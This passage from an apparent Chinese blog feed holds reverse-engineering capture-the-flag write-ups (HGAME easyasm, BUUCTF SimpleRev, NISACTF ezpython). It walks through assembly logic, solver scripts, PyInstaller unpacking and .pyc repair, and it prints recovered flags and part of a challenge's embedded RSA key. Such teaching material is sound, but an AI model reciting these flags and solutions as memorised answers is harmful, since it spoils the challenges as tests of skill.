class="token punctuation">,</span> axmov     al<span class="token punctuation">,</span> <span class="token punctuation">[</span>si<span class="token punctuation">]</span>shr     al<span class="token punctuation">,</span> <span class="token number">1</span>shr     al<span class="token punctuation">,</span> <span class="token number">1</span>shr     al<span class="token punctuation">,</span> <span class="token number">1</span>shr     al<span class="token punctuation">,</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先通过异或 <code>xor     ax, ax</code> 将 <code>ax</code> 清零，接着将 <code>[si]</code> 的值存入 <code>ax</code><br>然后 4 个 <code>shr     al, 1</code> 将 <code>al</code> 逻辑右移（高位补 0） 4 位</p><p><mark>注意这里：</mark></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pop     bxadd     ax<span class="token punctuation">,</span> bx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里将刚刚 <code>push    ax</code> 时入栈的 <code>ax</code> 出栈作为 <code>bx</code></p><p>假设 <code>[si] = xxxx yyyy</code><br>此时的 <code>bx</code> 应该为 <code>yyyy 0000</code>，而此时 ax 的值为 <code>0000 xxxx</code><br>因此 <code>add     ax, bx</code> 后，<code>ax = yyyy xxxx</code><br>即：<strong>此过程其实就是将 <code>[si]</code> 的高位和低位互换位置</strong></p><p>根据：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">xor     ax<span class="token punctuation">,</span> <span class="token number">17</span>hadd     si<span class="token punctuation">,</span> <span class="token number">1</span>cmp     al<span class="token punctuation">,</span> es<span class="token operator">:</span><span class="token punctuation">[</span>si<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>jz      <span class="token keyword">short</span> loc_100DD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里将 <code>ax</code>（互换高位和低位后的 <code>[si]</code>） 与 0x17 异或，计数器 <code>si</code> 加一，然后将 <code>al</code> 与以 <code>es</code> 为段首址、以 <code>si - 1</code> 为偏移地址的地址处的值进行比较（<code>ES</code> 是附加数据段的段首址），如果相等就继续往下循环，否则就输出 “wrong!”</p><p>因此，程序逻辑就是将 flag 的每个字符的 前四位 和 后四位 进行置换，然后与 0x17 异或，再与 <code>es</code> 段的数据进行逐位比较</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_10030 <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span>      <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span>  <span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x1c</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      key <span class="token operator">=</span> unk_10030<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x17</span>      key_h <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>key <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">)</span>      key_l <span class="token operator">=</span> key <span class="token operator">-</span> key_h <span class="token operator">*</span> <span class="token number">16</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>key_l <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> key_h<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>hgame{welc0me_to_4sm_w0rld}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HGAME-easyasm6.png" alt="HGAME-easyasm6.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【BUUCTF】SimpleRev</title>
      <link href="/posts/5fded92b.html"/>
      <url>/posts/5fded92b.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>熟悉<mark>大端序、小端序</mark></p></li><li><p>熟悉汇编中 <code>str2 db 68h dup(?)</code> 的写法</p></li></ul><hr><p><a href="https://buuoj.cn/challenges#SimpleRev">【BUUCTF】SimpleRev</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>拖入 IDA，直接查看 <code>main()</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-SimpleRev1.png" alt="BUUCTF-SimpleRev1.png"></p><p>逻辑很简单，输入 <code>&quot;q/Q&quot;</code>，执行语句：<br><code>(Decry)(&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv);</code></p><p>查看函数 <code>(Decry)</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-SimpleRev2.png" alt="BUUCTF-SimpleRev2.png"></p><p>注意这里的 src、v9 均为小端存放<br>而且 <code>text = join(key3, v9)</code> 中传入的参数是 v9 的首地址，即 <code>v9[0]</code> 的值</p><p>将 <code>v9[0]</code> 两位一组，逆序输出为字符串：<code>v9[0] = 0x77 6F 64 61 68LL</code><br>即：0x68 0x61 0x64 0x6F 0x77，得到 “<strong>hadow</strong>“</p><p>将 <strong>src</strong> 两位一组，逆序输出为字符串：<code>*src = 0x53 4C 43 44 4ELL</code><br>即：0x4E 0x44 0x43 0x4C 0x53，得到 “<strong>NDCLS</strong>“</p><p>根据 <strong>key3</strong> 的值 “<strong>kills</strong>“</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-SimpleRev3.png" alt="BUUCTF-SimpleRev3.png"></p><p>依据题意，得到拼接处理后的字符串：<br><strong>text： killshadow</strong><br><strong>key: ADSFKNDCLS</strong></p><p>由于代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v5 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span><span class="token operator">++</span>v3<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只是一个初始化操作，并未涉及 flag 的值，直接跑一遍，发现该代码是将 key 由大写变成了小写<br>得到 <strong>key：adsfkndcls</strong></p><p>最后的循环采用正向爆破来解决<br>循环一次读取一个输入的字符，当该字符是大写字母或者小写字母时，就进行操作：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">str2<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v1 <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">++</span>v3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果是空格就跳过，处理下一个，直到全部处理完，遇到 <code>&#39;\n&#39;</code>，循环结束<br>最后必须满足：<code>text == str2</code></p><p>这里关于 str2 的定义：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-SimpleRev4.png" alt="BUUCTF-SimpleRev4.png"></p><p><mark>语句 <code>str2 db 68h dup(?)</code> 是指开辟一个 68h 长度的空间，且不进行初始化</mark></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sstream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>string <span class="token function">little_endian</span><span class="token punctuation">(</span>__int64 num<span class="token punctuation">,</span> <span class="token keyword">int</span> width_num<span class="token punctuation">,</span> <span class="token keyword">int</span> buffer_length<span class="token punctuation">,</span> <span class="token keyword">int</span> width_buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width_num <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width_num <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width_num<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span>    string buffer <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token operator">=</span>width_num<span class="token punctuation">;</span> index<span class="token operator">>=</span><span class="token number">2</span><span class="token punctuation">;</span> index<span class="token operator">-=</span>width_buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>width_buffer<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>width_buffer<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 将width_buffer长度的字符串转换为十进制数，存放到sum</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>            sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>width_buffer<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        index <span class="token operator">=</span> index <span class="token operator">-</span> width_buffer<span class="token punctuation">;</span>   <span class="token comment">// 因为前面修改了index，后面还要用index控制循环，所以这里将其还原</span>        buffer <span class="token operator">+=</span> sum<span class="token punctuation">;</span>  <span class="token comment">// 将字符sum逆向存储到 buffer字符串</span>        buffer_length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> buffer<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    __int64 src <span class="token operator">=</span> <span class="token number">0x534C43444ELL</span><span class="token punctuation">;</span>    __int64 v9<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x776F646168LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">,</span> v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    string key3 <span class="token operator">=</span> <span class="token string">"kills"</span><span class="token punctuation">;</span>    string key1 <span class="token operator">=</span> <span class="token string">"ADSFK"</span><span class="token punctuation">;</span>    string s_v9<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> s_src<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token comment">// hadow   NDCLS</span>    s_v9 <span class="token operator">=</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>v9<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s_src <span class="token operator">=</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    string text <span class="token operator">=</span> key3 <span class="token operator">+</span> s_v9<span class="token punctuation">;</span>    string key <span class="token operator">=</span> key1 <span class="token operator">+</span> s_src<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"text: "</span><span class="token operator">&lt;&lt;</span>text<span class="token operator">&lt;&lt;</span><span class="token string">"   "</span><span class="token operator">&lt;&lt;</span><span class="token string">"key: "</span><span class="token operator">&lt;&lt;</span>key<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">int</span> v5 <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>            key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span>        <span class="token operator">++</span>v3<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"key: "</span><span class="token operator">&lt;&lt;</span>key<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> text<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token operator">>=</span><span class="token number">65</span> <span class="token operator">&amp;&amp;</span> j<span class="token operator">&lt;=</span><span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>j<span class="token operator">>=</span><span class="token number">97</span> <span class="token operator">&amp;&amp;</span> j<span class="token operator">&lt;=</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token operator">++</span>v3<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">++</span>v2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>KLDQCUDFZO</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-SimpleRev5.png" alt="BUUCTF-SimpleRev5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【NISACTF】ezpython</title>
      <link href="/posts/ef6f71f1.html"/>
      <url>/posts/ef6f71f1.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>熟悉 <mark>python 逆向</mark>中 exe 解包工具 pyinstxtractor.py 的使用方法【.exe -&gt; .pyc】</p></li><li><p>熟悉 python 逆向中反编译工具 uncompyle6 的使用方法【.pyc -&gt; .py】</p></li><li><p><mark>用反编译后生成的 struct 文件的文件头修复损坏的 .pyc 文件头</mark></p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/2038">【NISACTF】ezpython</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看 exeinfo pe，为 python 逆向</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-ezpython1.png" alt="NISACTF-ezpython1.png"></p><p>用 <code>pyinstxtractor.py</code> 进行常规解包：<code>python pyinstxtractor.py ez_python.exe</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-ezpython2.png" alt="NISACTF-ezpython2.png"></p><p><strong>根据 <code>[*] Python version: 34</code> 可知该 exe 文件对应的 python 版本为 python 3.4</strong><br><strong>（如：38 对应 python 3.8；310 对应 python 3.10）</strong></p><p>在生成的文件夹下，发现一个<strong>没有后缀名的 src 文件</strong>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-ezpython3.png" alt="NISACTF-ezpython3.png"></p><p>这里还存在一个<strong>没有后缀名的 struct 文件是 python 逆向后必有的，虽然没有后缀名，但它是一个 .pyc 文件</strong></p><p>在 exeinfo pe 下查看 src 文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-ezpython4.png" alt="NISACTF-ezpython4.png"></p><p>无法识别，但是文件头很奇怪，应该又是被修改了</p><p>用 struct 文件的文件头修复 src（将文件头第一行替换即可）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-ezpython5.png" alt="NISACTF-ezpython5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-ezpython6.png" alt="NISACTF-ezpython6.png"></p><p>根据 python 版本，需要用 python 3.4 进行编译<br>得到代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rsa<span class="token keyword">import</span> base64key1 <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">.</span>load_pkcs1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcVFJQkFBS0NBUUVBcVJUZ0xQU3BuT0ZDQnJvNHR1K1FBWXFhTjI2Uk42TzY1bjBjUURGRy9vQ1NJSU00ClNBeEVWaytiZHpSN2FucVNtZ1l5MEhRWGhDZTM2U2VGZTF0ejlrd0taL3UzRUpvYzVBSzR1NXZ4UW5QOWY1cTYKYVFsbVAvVjJJTXB5NFFRNlBjbUVoNEtkNm81ZWRJUlB2SHd6V0dWS09OQ3BpL0taQ082V0tWYkpXcWh3WGpEQgpsSDFNVURzZ1gyVUM4b3Bodnk5dXIyek9kTlBocElJZHdIc1o5b0ZaWWtaMUx5Q0lRRXRZRmlKam1GUzJFQ1RVCkNvcU9acnQxaU5jNXVhZnFvZlB4eHlPb2wwYVVoVGhiaHE4cEpXL3FPSFdYd0xJbXdtNk96YXFVeks4NEYyY3UKYWRiRE5zeVNvaElHaHYzd0lBVThNSlFnOEthd1Z3ZHBzRWhlSXdJREFRQUJBb0lCQURBazdwUStjbEZtWHF1Vgp1UEoyRWxZdUJpMkVnVHNMbHZ0c1ltL3cyQnM5dHQ0bEh4QjgxYlNSNUYyMEJ2UlJ4STZ3OXlVZCtWZzdDd1lMCnA5bHhOL3JJdWluVHBkUEhYalNhaGNsOTVOdWNOWEZ4T0dVU05SZy9KNHk4dUt0VHpkV3NITjJORnJRa0o4Y2IKcWF5czNOM3RzWTJ0OUtrUndjbUJGUHNJalNNQzB5UkpQVEE4cmNqOFkranV3SHZjbUJPNHVFWXZXeXh0VHR2UQova0RQelBqdTBuakhkR055RytkSDdkeHVEV2Jxb3VZQnRMdzllZGxXdmIydTJ5YnZzTXl0NWZTOWF1a01NUjNoCnBhaDRMcU1LbC9ETTU3cE44Vms0ZTU3WE1zZUJLWm1hcEptcVNnSGdjajRPNWE2R1RvelN1TEVoTmVGY0l2Tm8KWFczTEFHRUNnWWtBc0J0WDNVcFQ3aUcveE5BZDdSWER2MENOY1k1QnNZOGY4NHQ3dGx0U2pjSWdBKy9nUjFMZQpzb2gxY1RRd1RadUYyRTJXL1hHU3orQmJDTVVySHNGWmh1bXV6aTBkbElNV3ZhU0dvSlV1OGpNODBlUjRiVTRyCmdYQnlLZVZqelkzNVlLejQ5TEVBcFRQcTZRYTVQbzhRYkF6czhuVjZtNXhOQkNPc0pQQ29zMGtCclFQaGo5M0cKOFFKNUFQWEpva0UrMmY3NXZlazZNMDdsaGlEUXR6LzRPYWRaZ1MvUVF0eWRLUmg2V3VEeGp3MytXeXc5ZjNUcAp5OXc0RmtLRzhqNVRpd1RzRmdzem94TGo5TmpSUWpq